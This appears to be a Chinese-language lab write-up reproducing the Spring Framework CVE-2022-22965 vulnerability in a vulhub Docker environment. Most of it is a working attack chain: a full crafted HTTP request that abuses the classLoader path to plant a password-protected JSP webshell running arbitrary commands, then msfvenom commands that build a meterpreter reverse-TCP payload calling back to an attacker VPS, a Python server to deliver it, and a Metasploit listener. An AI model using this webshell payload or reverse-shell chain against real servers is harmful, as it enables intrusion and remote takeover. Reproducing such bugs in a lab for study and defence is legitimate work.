## 漏洞介绍：

  
该CVE-2022-22965是在Java
9的环境下，引入了class.module.classLoader，导致了CVE-2010-1622漏洞补丁的绕过，JDK9中存在可以绕过黑名单禁用的类，导致了这个漏洞。  
  
---  
  
## 影响版本：

Spring Framework 5.3.X < 5.3.18  
Spring Framework 5.2.X < 5.2.20

## 一、复现工具：

> 1.docker+vulhub
>
> 2.burpsuite
>
> 3.一台vps（虚拟机也可以）

docker跟vulhub安装下载就不说了，网上多的是，下面启动漏洞环境的命令

> systemctl start docker 启动docker
>
> docker-compose up -d启动漏洞环境
>
> docker-compose down 删除漏洞环境

## 二、漏洞验证

### 1.访问8080端口

![](https://image.3001.net/images/20220920/1663662541_632979cd08243c457a514.png!small)

### 2.写入jsp文件

![](https://image.3001.net/images/20220920/1663662559_632979df74340f1db283f.png!small)

    
    
    GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
    Host: localhost:8080
    Accept-Encoding: gzip, deflate
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    Connection: close
    suffix: %>//
    c1: Runtime
    c2: <%
    DNT: 1
    

### 3.访问写入的webshell文件

http://your-ip:8080/tomcatwar.jsp?pwd=j&cmd=whoami

![](https://image.3001.net/images/20220920/1663662574_632979eef16487224a1e4.png!small)

## 三、反弹shell

### 1.用msf生成木马

    
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your-公网ip LPORT=2626 -f elf > shell.elf

![](https://image.3001.net/images/20220920/1663662589_632979fd78165196d3aca.png!small)

### 2.然后去木马的当前目录下开启开启web服务，并访问jsp shell文件请求下载生成的木马

    
    
    python3 -m http.server 2626（端口随便写，但是要打开对应的防火墙规则）

![](https://image.3001.net/images/20220920/1663662604_63297a0ce82d8155a235c.png!small)

![](https://image.3001.net/images/20220920/1663662624_63297a2029c2ce97d3404.png!small)

### 3.可以防止木马文件没有执行权限，这先给个权限

chmod 777 shell.elf

###
![](https://image.3001.net/images/20220920/1663662639_63297a2f1d8432becfbc3.png!small)

### 4.msf开启监听

    
    
    msfconsole                                         # 在命令行里面输入命令，进入msf漏洞利用框架；
    use exploit/multi/handler                          # 监听木马反弹过来的shell
    set payload linux/x86/meterpreter/reverse_tcp  	   # 设置payload，不同的木马设置不同的payload，设置payload时，要根据目标系统的系统位数设置相应的payload;
    set lhost vps                                      # 我们的vps ip
    set lport vps端口                                  # 我们的vps端口
    exploit                                            # 开始进行监听；

![](https://image.3001.net/images/20220920/1663662656_63297a40e59375890b01c.png!small)

### 5.执行木马

![](https://image.3001.net/images/20220920/1663662671_63297a4f9c3eae8c1c1bd.png!small)

### 6.反弹成功

![](https://image.3001.net/images/20220920/1663662692_63297a649444ebb77b45f.png!small)

